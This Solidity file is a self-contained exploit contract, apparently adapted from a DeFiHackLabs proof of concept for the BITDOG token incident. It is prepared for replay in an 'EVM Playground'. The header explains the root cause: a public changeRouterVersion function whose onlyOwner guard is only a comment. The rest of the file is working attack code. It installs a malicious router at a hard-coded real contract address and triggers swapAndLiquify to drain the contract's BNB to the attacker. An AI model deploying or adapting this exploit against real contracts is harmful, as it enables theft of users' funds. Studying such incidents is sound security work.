// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2025-04-bitdog).
// The DeFiHackLabs PoC (test/bitdog_exp.sol) runs the attack inside a Foundry
// `ContractTest is BaseTestWithBalanceLog` (forge-std `Test`) contract, and the
// attacker role is simply `address(this)` on that test contract — there is no
// `vm.prank`/`vm.startPrank` of the historical attacker EOA anywhere. This
// contract is a faithful, self-contained copy of that inline attack (the
// `testExploit()` body -> `attack()`; `MaliciousBITDOGRouter` copied verbatim)
// with the forge-std `Test` dependency and assertions removed so it can be
// deployed and recorded standalone by the playground.
//
// Root cause: BITDOG.changeRouterVersion(uint256,address) is the only function
// that writes the `uniswapV2Router` / `uniswapPair` storage slots, and it is
// declared `public` — the intended `onlyOwner` restriction exists only as a
// comment (`/* onlyOwner */`). Any account can therefore install its own
// contract as BITDOG's "router". BITDOG already holds >700 BITDOG tokens (well
// above `minimumTokensBeforeSwapAmount`) and >2.10 pre-existing BNB at this fork
// block, so a single zero-amount `transfer()` trips `swapAndLiquify()`. The fake
// router's swap is a no-op, so `swapAndLiquify` reads `amountReceived =
// address(this).balance` — the contract's entire *pre-existing* BNB balance,
// not the swap delta — and forwards it to the fake router's `addLiquidityETH`,
// which the attacker's helper routes straight to the caller.

interface IBITDOG {
    function changeRouterVersion(uint256 efgnffw, address newRouterAddress) external returns (address newPairAddress);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract BitdogRouterHijack {
    IBITDOG internal constant BITDOG = IBITDOG(0x4BBb53252B0ceE84e6824e85989Ea2EddEec25F1);

    // Profit lands directly on this contract's own balance, mirroring the real
    // PoC where `attacker == address(this)` on the test contract.
    receive() external payable {}

    function attack() external {
        // step 1: install an attacker-controlled router/pair through the public
        // changeRouterVersion() path — the onlyOwner guard is only a comment.
        MaliciousBITDOGRouter fakeRouter = new MaliciousBITDOGRouter(address(BITDOG), address(this));
        fakeRouter.install();

        // step 2: trigger swapAndLiquify(). Amount zero is sufficient because the
        // BITDOG contract's own token balance already exceeds
        // minimumTokensBeforeSwapAmount at this fork block.
        BITDOG.transfer(address(fakeRouter), 0);
    }
}

contract MaliciousBITDOGRouter {
    address private immutable token;
    address private immutable profitReceiver;

    receive() external payable {}

    constructor(address _token, address _profitReceiver) {
        token = _token;
        profitReceiver = _profitReceiver;
    }

    function install() external {
        IBITDOG(token).changeRouterVersion(0, address(this));
    }

    function factory() external view returns (address) {
        return address(this);
    }

    function WETH() external pure returns (address) {
        return address(0);
    }

    function getPair(address, address) external view returns (address) {
        return address(this);
    }

    function createPair(address, address) external view returns (address) {
        return address(this);
    }

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256,
        uint256,
        address[] calldata,
        address,
        uint256
    ) external {}

    function addLiquidityETH(
        address,
        uint256 amountTokenDesired,
        uint256,
        uint256,
        address,
        uint256
    ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity) {
        (bool ok,) = profitReceiver.call{value: msg.value}("");
        require(ok, "profit transfer failed");
        return (amountTokenDesired, msg.value, 0);
    }
}
